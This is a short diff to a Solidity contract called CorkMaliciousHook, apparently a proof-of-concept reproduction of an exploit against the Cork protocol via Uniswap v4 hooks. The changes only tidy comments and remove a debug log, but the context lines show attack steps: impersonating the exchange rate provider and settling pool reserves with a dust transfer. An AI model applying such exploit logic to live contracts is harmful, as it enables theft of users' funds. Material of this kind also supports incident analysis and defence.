@@ -150,7 +150,7 @@ contract CorkMaliciousHook {
         (address[] memory cts_3, address[] memory ds_3) = assetFactory.getDeployedSwapAssets(
             _weETH8DS,
             address(wstETH),
-            1, // TODO: why?
+            1,
             100,
             address(this), // Impersonating the exchange rate provider
             0,
@@ -209,8 +209,6 @@ contract CorkMaliciousHook {
         wstETH.approve(address(moduleCore), 0);
         wstETH.approve(address(corkHook), 0);
         wstETH.approve(address(flashSwapProxy), 0);
-
-        console.log(wstETH.balanceOf(address(this)));
     }
 
     // Callback from when issuing new DS
@@ -331,8 +329,7 @@ contract CorkMaliciousHook {
 
         // 4.16 Sync the pool reserves to settle ETH8-DS2
         uniV4PoolManager.sync(decodedData.weETH8DS);
-        IERC20(decodedData.weETH8DS).transfer(address(uniV4PoolManager), 1); // TODO: might have something to
-            // do with previous 1
+        IERC20(decodedData.weETH8DS).transfer(address(uniV4PoolManager), 1); // trigger updates with dust
         uniV4PoolManager.settleFor(address(corkHook));
 
         return ""; // to comply with the interface
